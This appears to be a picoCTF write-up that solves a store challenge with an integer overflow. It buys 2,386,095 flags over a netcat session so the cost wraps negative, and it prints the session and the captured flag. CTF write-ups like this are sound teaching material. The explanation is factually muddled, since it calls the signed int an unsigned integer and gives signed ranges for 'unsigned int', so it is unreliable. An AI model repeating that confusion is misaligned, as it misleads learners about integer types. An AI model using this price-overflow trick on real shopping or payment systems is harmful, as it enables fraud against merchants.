## Walkthrough

Walking through the store, we guess that we have to buy the *1337 flags*. Guess what, we don't have enough money for this...

Looking at the store source, there is an interesting thing here :

```C
int total_cost = 0; (4 bytes / signed)
total_cost = 900*number_flags;
```

*total_cost* is defined as an *int*, i.e. a 4 bytes unsigned integer. Its value is linked to a user input: the number of flags to buy. So we can perform a nice unsigned interger overflow here, to get a negative value and so more money :)

Unsigned int values range from -2,147,483,648 to 2,147,483,647. Divided by 900, we just have to buy more than 2,386,092â€¬ flags to produce an integer overflow so that `account_balance - total_cost` does not overflow (else our overflow is going to cause another overflow and a negative balance...).

Let's try with 2,386,095 flags :

```bash
root@kali:~# nc 2019shell1.picoctf.com 60851
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896
```

I'm rich !, now the flag :

```bash
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag

1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_34c9a5f7}
